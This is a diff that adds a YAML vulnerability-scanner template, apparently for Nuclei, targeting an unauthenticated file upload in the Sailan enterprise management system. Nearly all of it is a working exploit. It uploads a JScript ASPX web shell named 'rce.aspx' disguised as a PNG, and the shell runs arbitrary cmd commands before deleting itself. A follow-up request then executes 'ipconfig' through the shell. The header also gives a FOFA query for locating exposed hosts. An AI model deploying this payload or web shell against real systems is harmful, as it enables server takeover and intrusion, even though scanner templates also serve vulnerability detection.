@@ -1,0 +1,65 @@
+http:
+    - extractors:
+        - group: 1
+          internal: true
+          name: uploadfile
+          part: body
+          regex:
+            - (\/([^"]+\.aspx))
+          type: regex
+      raw:
+        - |
+          POST /SystemModule/System_FocusList/SubmitUploadify?FolderId=1&UserId=1 HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2558.72 Safari/537.36
+          Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
+
+          -----------------------------142851345723692939351758052805
+          Content-Disposition: form-data; name="Filedata"; filename="rce.aspx"
+          Content-Type: image/png
+
+          <%@ Page Language="Jscript" validateRequest="false" %>
+          <%
+          var c=new System.Diagnostics.ProcessStartInfo("cmd");
+          var e=new System.Diagnostics.Process();
+          var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+          c.UseShellExecute=false;
+          c.RedirectStandardOutput=true;
+          c.RedirectStandardError=true;
+          e.StartInfo=c;
+          c.Arguments="/c " + Request.Item["cmd"];
+          e.Start();
+          out=e.StandardOutput;
+          EI=e.StandardError;
+          e.Close();
+          Response.Write(out.ReadToEnd() + EI.ReadToEnd());
+          System.IO.File.Delete(Request.PhysicalPath);
+          Response.End();%>
+          -----------------------------142851345723692939351758052805--
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - Windows IP
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /{{uploadfile}}?cmd=ipconfig HTTP/1.1
+          Host: {{Hostname}}
+id: sailan-System_FocusList_SubmitUploadify-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/Home6/AdminPretty"
+        赛蓝企业管理系统 /SystemModule/System_FocusList/SubmitUploadify接口处存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 赛蓝企业管理系统 /SystemModule/System_FocusList/SubmitUploadify 存在任意文件上传
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486192&idx=1&sn=6f231535bb6cd0935d6b7dc036d2e79f&chksm=c267bfc3f51036d5cdcdb87e831e05c1525a478323c83d0dfa0ecc94f436fb484dd3d5efb5d9&token=1742030890&lang=zh_CN#rd
+    severity: high
+    tags:
+        - Oce
+        - NOS
+        - 赛蓝企业管理系统
